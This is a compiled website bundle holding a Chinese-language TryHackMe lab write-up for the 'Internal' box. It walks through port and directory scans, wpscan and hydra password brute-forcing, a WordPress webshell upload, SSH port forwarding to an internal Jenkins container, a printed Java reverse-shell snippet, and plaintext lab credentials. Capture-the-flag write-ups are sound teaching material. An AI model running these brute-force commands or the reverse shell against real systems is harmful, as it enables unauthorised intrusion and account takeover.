"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[8245],{77030:(e,n,a)=>{a.r(n),a.d(n,{assets:()=>l,contentTitle:()=>i,default:()=>u,frontMatter:()=>s,metadata:()=>o,toc:()=>d});var t=a(74848),r=a(28453);const s={sidebar_position:162,tags:["Easy","Linux","\u5bc6\u7801\u7834\u89e3-\u5f31\u5bc6\u7801","\u7aef\u53e3\u8f6c\u53d1","docker"],title:"Internal",description:"Internal",sidebar_label:"Internal",slug:"/tryhackme/162"},i="Internal",o={id:"box/TryHackMe/162",title:"Internal",description:"Internal",source:"@site/docs/box/TryHackMe/162.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/162",permalink:"/docs/tryhackme/162",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"\u5bc6\u7801\u7834\u89e3-\u5f31\u5bc6\u7801",permalink:"/docs/tags/\u5bc6\u7801\u7834\u89e3-\u5f31\u5bc6\u7801"},{label:"\u7aef\u53e3\u8f6c\u53d1",permalink:"/docs/tags/\u7aef\u53e3\u8f6c\u53d1"},{label:"docker",permalink:"/docs/tags/docker"}],version:"current",sidebarPosition:162,frontMatter:{sidebar_position:162,tags:["Easy","Linux","\u5bc6\u7801\u7834\u89e3-\u5f31\u5bc6\u7801","\u7aef\u53e3\u8f6c\u53d1","docker"],title:"Internal",description:"Internal",sidebar_label:"Internal",slug:"/tryhackme/162"},sidebar:"boxSidebar",previous:{title:"Daily Bugle",permalink:"/docs/tryhackme/161"},next:{title:"Retro",permalink:"/docs/tryhackme/163"}},l={},d=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"80",id:"80",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"www-data",id:"www-data",level:3},{value:"www-data \u2014&gt;aubreanna",id:"www-data-aubreanna",level:3},{value:"aubreanna \u2014&gt; jenkins",id:"aubreanna--jenkins",level:3},{value:"jenkins  \u2014&gt; root",id:"jenkins---root",level:3}];function c(e){const n={code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",p:"p",pre:"pre",...(0,r.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.h1,{id:"internal",children:"Internal"}),"\n",(0,t.jsx)(n.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-193-102:~# nmap -sTCV -p- --min-rate 1000 10.10.220.148\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-10-15 11:05 BST\nNmap scan report for ip-10-10-220-148.eu-west-1.compute.internal (10.10.220.148)\nHost is up (0.0010s latency).\nNot shown: 65533 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)\n|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)\n|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (EdDSA)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Apache2 Ubuntu Default Page: It works\nMAC Address: 02:89:E0:C2:C5:39 (Unknown)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 10.82 seconds\n"})}),"\n",(0,t.jsx)(n.h2,{id:"80",children:"80"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-193-102:~# gobuster dir -u http://10.10.220.148/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.220.148/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Extensions:     php,txt,html\n[+] Timeout:        10s\n===============================================================\n2023/10/15 11:06:04 Starting gobuster\n===============================================================\n/index.html (Status: 200)\n/blog (Status: 301)\n/wordpress (Status: 301)\n/javascript (Status: 301)\n/phpmyadmin (Status: 301)\n/server-status (Status: 403)\n===============================================================\n2023/10/15 11:10:23 Finished\n===============================================================\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u901a\u8fc7\u76ee\u5f55\u626b\u63cf\u6211\u4eec\u53ef\u4ee5\u786e\u8ba4\u5176\u662f\u4e00\u4e2a wordpress \u7ad9\u70b9, \u4e4b\u540e\u6211\u4f7f\u7528 wpscan \u626b\u63cf\u51fa\u5176\u4e2d\u7684\u7528\u6237, \u4e4b\u540e\u8fdb\u884c\u4e86\u518d\u6b21\u8fdb\u884c\u4e86\u626b\u63cf, \u4f46\u662f\u6ca1\u6709\u53d1\u73b0\u4ec0\u4e48\u53ef\u4ee5\u5229\u7528\u7684\u5730\u65b9, \u4e4b\u540e\u5c31\u8fdb\u884c\u4e86\u66b4\u529b\u7834\u89e3\u83b7\u5f97\u4e86 admin \u7528\u6237\u5bc6\u7801"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-193-102:~/internal# wpscan --password-attack xmlrpc -t 20 -U admin -P `locate rockyou.txt` --url http://10.10.220.148/blog/\n[+] Performing password attack on Xmlrpc against 1 user/s\n[SUCCESS] - admin / my2boys\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u4e4b\u540e\u767b\u9646\u7ba1\u7406\u5458\u540e\u53f0\u4e0a\u4f20 WebShell, \u5c31\u4e0d\u8fc7\u591a\u8bf4\u4e86"}),"\n",(0,t.jsx)(n.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,t.jsx)(n.h3,{id:"www-data",children:"www-data"}),"\n",(0,t.jsx)(n.p,{children:"\u8bbf\u95ee\u6211\u4eec\u4e0a\u4f20\u7684 WebShell \u5c31\u83b7\u53d6\u5230\u4e86 www-data \u7528\u6237\u7684 Shell"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-195120.png",alt:"image-20240709195119008"})}),"\n",(0,t.jsx)(n.h3,{id:"www-data-aubreanna",children:"www-data \u2014>aubreanna"}),"\n",(0,t.jsx)(n.p,{children:"\u5728\u6d4f\u89c8 opt \u76ee\u5f55\u65f6\u6211\u53d1\u73b0\u5176\u4e2d\u6709\u4e00\u4e2a\u7279\u6b8a\u540d\u79f0\u7684\u6587\u4ef6, \u7ecf\u8fc7\u67e5\u770b\u6211\u53d1\u73b0\u5176\u4e2d\u662f aubreanna \u51ed\u8bc1"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"(remote) www-data@internal:/$ ls -al /opt\ntotal 16\ndrwxr-xr-x  3 root root 4096 Aug  3  2020 .\ndrwxr-xr-x 24 root root 4096 Aug  3  2020 ..\ndrwx--x--x  4 root root 4096 Aug  3  2020 containerd\n-rw-r--r--  1 root root  138 Aug  3  2020 wp-save.txt\n(remote) www-data@internal:/$ cd opt\n(remote) www-data@internal:/opt$ cat wp-save.txt \nBill,\n\nAubreanna needed these credentials for something later.  Let her know you have them and where they are.\n\naubreanna:bubb13guM!@#123\n(remote) www-data@internal:/opt$ su aubreanna\nPassword: \naubreanna@internal:/opt$ id\nuid=1000(aubreanna) gid=1000(aubreanna) groups=1000(aubreanna),4(adm),24(cdrom),30(dip),46(plugdev)\n"})}),"\n",(0,t.jsx)(n.h3,{id:"aubreanna--jenkins",children:"aubreanna \u2014> jenkins"}),"\n",(0,t.jsx)(n.p,{children:"\u5728\u7528\u6237 aubreanna \u7684\u5bb6\u76ee\u5f55\u641c\u7d22\u65f6, \u6211\u53d1\u73b0\u4e00\u4e9b\u7279\u6b8a\u7684\u6587\u4ef6\u5185\u5bb9"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"aubreanna@internal:~$ cat jenkins.txt \nInternal Jenkins service is running on 172.17.0.2:8080\n"})}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-195133.png",alt:"image-20240709195131385"})}),"\n",(0,t.jsx)(n.p,{children:"\u4ece\u4e0a\u9762\u7684\u8fd9\u4e9b\u5185\u5bb9\u4e2d\u6211\u4eec\u77e5\u9053 root \u7528\u6237\u542f\u52a8\u4e86\u4e00\u4e2a jenkines \u7684 docker , \u6240\u4ee5\u6211\u4eec\u9700\u8981\u901a\u8fc7\u7aef\u53e3\u8f6c\u53d1\u6765\u5b9e\u73b0\u8bbf\u95ee\u8fd9\u4e2a\u670d\u52a1"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"$ ssh -L  8080:127.0.0.1:8080  aubreanna@internal.thm # \u4f7f\u7528\u6b64\u547d\u4ee4\u8fdb\u884c\u7aef\u53e3\u8f6c\u53d1\n.....\n"})}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-195141.png",alt:"image-20240709195139308"})}),"\n",(0,t.jsx)(n.p,{children:"\u901a\u8fc7\u8bbf\u95ee\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u8fd9\u662f\u4e00\u4e2a\u767b\u9646\u7a97\u53e3, \u4f46\u662f\u6211\u4eec\u9700\u8981\u83b7\u53d6\u8d26\u53f7, \u6240\u4ee5\u6211\u4eec\u53ef\u80fd\u9700\u8981\u66b4\u529b\u7834\u89e3, jenkines \u7684\u9ed8\u8ba4\u8d26\u53f7\u65f6 admin, \u8fdb\u884c\u66b4\u529b\u7834\u89e3"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:'$ hydra -l admin -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -s 8080  127.0.0.1 http-post-form "/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password"\n\nHydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-20 17:08:47\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task\n[DATA] attacking http-post-form://127.0.0.1:8080/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password\n[8080][http-post-form] host: 127.0.0.1   login: admin   password: spongebob\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-20 17:09:42\n'})}),"\n",(0,t.jsx)(n.p,{children:"\u767b\u9646\u4e4b\u540e\u6211\u641c\u7d22\u4e86\u5982\u4f55\u5229\u7528 Jenkins getShell \u6700\u7ec8\u83b7\u53d6\u5230\u4e86\u5982\u4e0b\u7684\u547d\u4ee4\u6267\u884c\u65b9\u5f0f, \u6211\u4eec\u53ef\u4ee5\u4ece\u4e0b\u9762\u53d1\u73b0\u786e\u5b9e\u5b8c\u6210\u4e86\u547d\u4ee4\u6267\u884c"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-195147.png",alt:"image-20240709195146289"})}),"\n",(0,t.jsx)(n.p,{children:"\u63a5\u7740\u7ee7\u7eed\u641c\u7d22\u6211\u53d1\u73b0\u4e86 rev \u7684\u65b9\u6cd5"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:'String host="localhost";\nint port=8044;\nString cmd="cmd.exe";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();\n'})}),"\n",(0,t.jsx)(n.p,{children:"\u6211\u4eec\u53ea\u9700\u8981\u5229\u7528\u6b64\u5c31\u53ef\u4ee5\u83b7\u53d6\u5230\u4e00\u4e2a Shell"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-195154.png",alt:"image-20240709195152423"})}),"\n",(0,t.jsx)(n.h3,{id:"jenkins---root",children:"jenkins  \u2014> root"}),"\n",(0,t.jsx)(n.p,{children:"\u5728\u83b7\u53d6\u5230 Docker \u4e2d\u641c\u7d22\u6211\u6700\u7ec8\u53d1\u73b0\u5728 opt \u76ee\u5f55\u4e0b\u4e5f\u5b58\u5728\u4e00\u4e2a\u540c\u6837\u7684\u7b14\u8bb0\u5185\u5bb9, \u5176\u4e2d\u662f root \u7684\u8d26\u53f7"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"(remote) jenkins@jenkins:/opt$ cat note.txt \nAubreanna,\n\nWill wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you \nneed access to the root user account.\n\nroot:tr0ub13guM!@#123\n"})})]})}function u(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(c,{...e})}):c(e)}},28453:(e,n,a)=>{a.d(n,{R:()=>i,x:()=>o});var t=a(96540);const r={},s=t.createContext(r);function i(e){const n=t.useContext(s);return t.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:i(e.components),t.createElement(s.Provider,{value:n},e.children)}}}]);